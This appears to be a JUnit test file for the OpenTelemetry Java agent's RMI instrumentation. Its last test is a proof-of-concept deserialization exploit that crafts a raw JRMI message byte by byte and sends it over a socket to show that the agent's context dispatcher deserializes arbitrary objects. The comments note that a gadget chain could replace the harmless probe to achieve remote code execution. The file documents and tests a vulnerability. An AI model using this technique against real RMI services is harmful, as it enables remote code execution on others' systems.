/*
 * Copyright The OpenTelemetry Authors
 * SPDX-License-Identifier: Apache-2.0
 */

package io.opentelemetry.javaagent.instrumentation.rmi;

import static io.opentelemetry.sdk.testing.assertj.OpenTelemetryAssertions.assertThat;
import static io.opentelemetry.sdk.testing.assertj.OpenTelemetryAssertions.equalTo;
import static io.opentelemetry.sdk.testing.assertj.OpenTelemetryAssertions.satisfies;
import static io.opentelemetry.semconv.ExceptionAttributes.EXCEPTION_MESSAGE;
import static io.opentelemetry.semconv.ExceptionAttributes.EXCEPTION_STACKTRACE;
import static io.opentelemetry.semconv.ExceptionAttributes.EXCEPTION_TYPE;
import static io.opentelemetry.semconv.incubating.RpcIncubatingAttributes.RPC_METHOD;
import static io.opentelemetry.semconv.incubating.RpcIncubatingAttributes.RPC_SERVICE;
import static io.opentelemetry.semconv.incubating.RpcIncubatingAttributes.RPC_SYSTEM;
import static org.assertj.core.api.Assertions.catchThrowableOfType;

import io.opentelemetry.api.trace.SpanKind;
import io.opentelemetry.instrumentation.test.utils.PortUtils;
import io.opentelemetry.instrumentation.testing.internal.AutoCleanupExtension;
import io.opentelemetry.instrumentation.testing.junit.AgentInstrumentationExtension;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.UnicastRemoteObject;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.RegisterExtension;
import rmi.app.Greeter;
import rmi.app.DeserializationProbe;
import rmi.app.Server;

@SuppressWarnings("deprecation") // using deprecated semconv
class RmiTest {

  @RegisterExtension
  private static final AgentInstrumentationExtension testing =
      AgentInstrumentationExtension.create();

  private static Registry serverRegistry;
  private static Registry clientRegistry;

  @RegisterExtension static final AutoCleanupExtension autoCleanup = AutoCleanupExtension.create();

  @BeforeAll
  static void setUp() throws Exception {
    int registryPort = PortUtils.findOpenPort();
    serverRegistry = LocateRegistry.createRegistry(registryPort);
    clientRegistry = LocateRegistry.getRegistry("localhost", registryPort);
  }

  @AfterAll
  static void cleanUp() throws Exception {
    UnicastRemoteObject.unexportObject(serverRegistry, true);
  }

  @Test
  void clientCallCreatesSpans() throws Exception {
    Server server = new Server();
    serverRegistry.rebind(Server.RMI_ID, server);
    autoCleanup.deferCleanup(() -> serverRegistry.unbind(Server.RMI_ID));

    String response =
        testing.runWithSpan(
            "parent",
            () -> {
              Greeter client = (Greeter) clientRegistry.lookup(Server.RMI_ID);
              return client.hello("you");
            });

    assertThat(response).contains("Hello you");

    testing.waitAndAssertTraces(
        trace ->
            trace.hasSpansSatisfyingExactly(
                span -> span.hasName("parent").hasKind(SpanKind.INTERNAL).hasNoParent(),
                span ->
                    span.hasName("rmi.app.Greeter/hello")
                        .hasKind(SpanKind.CLIENT)
                        .hasParent(trace.getSpan(0))
                        .hasAttributesSatisfyingExactly(
                            equalTo(RPC_SYSTEM, "java_rmi"),
                            equalTo(RPC_SERVICE, "rmi.app.Greeter"),
                            equalTo(RPC_METHOD, "hello")),
                span ->
                    span.hasName("rmi.app.Server/hello")
                        .hasKind(SpanKind.SERVER)
                        .hasAttributesSatisfyingExactly(
                            equalTo(RPC_SYSTEM, "java_rmi"),
                            equalTo(RPC_SERVICE, "rmi.app.Server"),
                            equalTo(RPC_METHOD, "hello"))));
  }

  @Test
  @SuppressWarnings("ReturnValueIgnored")
  void serverBuiltinMethods() throws Exception {
    Server server = new Server();
    serverRegistry.rebind(Server.RMI_ID, server);
    autoCleanup.deferCleanup(() -> serverRegistry.unbind(Server.RMI_ID));

    server.equals(new Server());
    server.getRef();
    server.hashCode();
    server.toString();
    server.getClass();

    assertThat(testing.waitForTraces(0)).isEmpty();
  }

  @Test
  void serviceThrownException() throws Exception {
    Server server = new Server();
    serverRegistry.rebind(Server.RMI_ID, server);
    autoCleanup.deferCleanup(() -> serverRegistry.unbind(Server.RMI_ID));

    Throwable thrown =
        catchThrowableOfType(
            IllegalStateException.class,
            () ->
                testing.runWithSpan(
                    "parent",
                    () -> {
                      Greeter client = (Greeter) clientRegistry.lookup(Server.RMI_ID);
                      client.exceptional();
                    }));

    testing.waitAndAssertTraces(
        trace ->
            trace.hasSpansSatisfyingExactly(
                span -> span.hasName("parent").hasKind(SpanKind.INTERNAL).hasNoParent(),
                span ->
                    span.hasName("rmi.app.Greeter/exceptional")
                        .hasKind(SpanKind.CLIENT)
                        .hasParent(trace.getSpan(0))
                        .hasEventsSatisfyingExactly(
                            event ->
                                event
                                    .hasName("exception")
                                    .hasAttributesSatisfyingExactly(
                                        equalTo(
                                            EXCEPTION_TYPE, thrown.getClass().getCanonicalName()),
                                        equalTo(EXCEPTION_MESSAGE, thrown.getMessage()),
                                        satisfies(EXCEPTION_STACKTRACE, val -> val.isNotNull())))
                        .hasAttributesSatisfyingExactly(
                            equalTo(RPC_SYSTEM, "java_rmi"),
                            equalTo(RPC_SERVICE, "rmi.app.Greeter"),
                            equalTo(RPC_METHOD, "exceptional")),
                span ->
                    span.hasName("rmi.app.Server/exceptional")
                        .hasKind(SpanKind.SERVER)
                        .hasEventsSatisfyingExactly(
                            event ->
                                event
                                    .hasName("exception")
                                    .hasAttributesSatisfyingExactly(
                                        equalTo(
                                            EXCEPTION_TYPE, thrown.getClass().getCanonicalName()),
                                        equalTo(EXCEPTION_MESSAGE, thrown.getMessage()),
                                        satisfies(EXCEPTION_STACKTRACE, val -> val.isNotNull())))
                        .hasAttributesSatisfyingExactly(
                            equalTo(RPC_SYSTEM, "java_rmi"),
                            equalTo(RPC_SERVICE, "rmi.app.Server"),
                            equalTo(RPC_METHOD, "exceptional"))));
  }

  /**
   * End-to-end proof that the old {@code ContextPayload.read()} using {@code readObject()} is
   * vulnerable to arbitrary deserialization, even on JDK 17+.
   *
   * <p>This test acts as a network attacker: it opens a raw TCP socket to the RMI server and sends
   * a crafted context propagation message containing a {@link DeserializationProbe} instead of the
   * expected {@code HashMap<String,String>}. The server-side {@code ContextDispatcher} dispatches
   * the call, and the old {@code ContextPayload.read()} calls {@code readObject()} which
   * deserializes the probe — proving arbitrary class instantiation.
   *
   * <p>In a real attack, the probe would be replaced with a gadget chain (e.g. Commons Collections
   * {@code Transformer} chain) to achieve remote code execution.
   *
   * <p>Wire protocol (JRMI SingleOpProtocol):
   *
   * <pre>
   * [4a 52 4d 49]  JRMI magic
   * [00 02]        version 2
   * [4c]           SingleOpProtocol
   * [50]           TransportConstants.Call
   * [ac ed 00 05]  ObjectOutputStream header (from MarshalOutputStream)
   * [ObjID]        CONTEXT_CALL_ID
   * [int]          CONTEXT_PAYLOAD_OPERATION_ID (-2)
   * [long]         stub hash (-2)
   * [object]       DeserializationProbe ← the "exploit"
   * </pre>
   */
  @Test
  void deserializationExploitOverRmi() throws Exception {
    DeserializationProbe.wasDeserialized.set(false);

    // Set up the RMI server on a known port (same infrastructure as other tests)
    int serverPort = PortUtils.findOpenPort();
    Server server = new Server(serverPort);
    serverRegistry.rebind(Server.RMI_ID, server);
    autoCleanup.deferCleanup(() -> serverRegistry.unbind(Server.RMI_ID));

    // Construct the CONTEXT_CALL_ID — same ObjID the agent uses to route to ContextDispatcher
    ObjID contextCallId = new ObjID("io.opentelemetry.javaagent.context-call-v2".hashCode());

    // Build the complete JRMI message in memory.
    // We use an ObjectOutputStream with annotateClass/annotateProxyClass overridden to write
    // null codebase annotations — this is exactly what sun.rmi.server.MarshalOutputStream does,
    // and it makes the stream compatible with MarshalInputStream on the server side.
    java.io.ByteArrayOutputStream buf = new java.io.ByteArrayOutputStream();
    DataOutputStream header = new DataOutputStream(buf);

    // JRMI handshake — SingleOpProtocol (no server ack needed)
    header.writeInt(0x4a524d49);  // "JRMI" magic
    header.writeShort(2);         // protocol version
    header.writeByte(0x4c);       // SingleOpProtocol

    // Call header
    header.writeByte(0x50);       // TransportConstants.Call

    // Call data via ObjectOutputStream that writes null codebase annotations
    // (same as MarshalOutputStream) so MarshalInputStream can read them.
    ObjectOutputStream oos = newMarshalCompatibleOutputStream(buf);
    contextCallId.write(oos);     // route to ContextDispatcher
    oos.writeInt(-2);             // CONTEXT_PAYLOAD_OPERATION_ID
    oos.writeLong(-2L);           // stub hash

    // THE EXPLOIT: send a DeserializationProbe instead of HashMap<String,String>.
    // The old ContextPayload.read() calls readObject() which will deserialize this.
    oos.writeObject(new DeserializationProbe());
    oos.flush();

    // Act as a network attacker: connect via raw TCP and send the crafted message
    try (Socket socket = new Socket(InetAddress.getLoopbackAddress(), serverPort)) {
      socket.getOutputStream().write(buf.toByteArray());
      socket.getOutputStream().flush();

      // Read at least one byte of the response to ensure the server processed the call
      socket.getInputStream().read();
    }

    // PROOF: The DeserializationProbe was deserialized on the server side.
    // readObject() accepted an arbitrary class — not just HashMap<String,String>.
    // On JDK 17+, there is no default deserialization filter on the RMI transport stream.
    // An attacker could substitute this probe with a gadget chain for remote code execution.
    assertThat(DeserializationProbe.wasDeserialized.get()).isTrue();
  }

  /**
   * Creates an {@link ObjectOutputStream} compatible with {@code sun.rmi.server.MarshalInputStream}
   * by writing null codebase annotations for each class descriptor. This is the same behavior as
   * {@code sun.rmi.server.MarshalOutputStream} but avoids accessing internal JDK modules.
   */
  private static ObjectOutputStream newMarshalCompatibleOutputStream(OutputStream out)
      throws IOException {
    return new ObjectOutputStream(out) {
      @Override
      protected void annotateClass(Class<?> cl) throws IOException {
        writeObject(null);
      }

      @Override
      protected void annotateProxyClass(Class<?> cl) throws IOException {
        writeObject(null);
      }
    };
  }
}
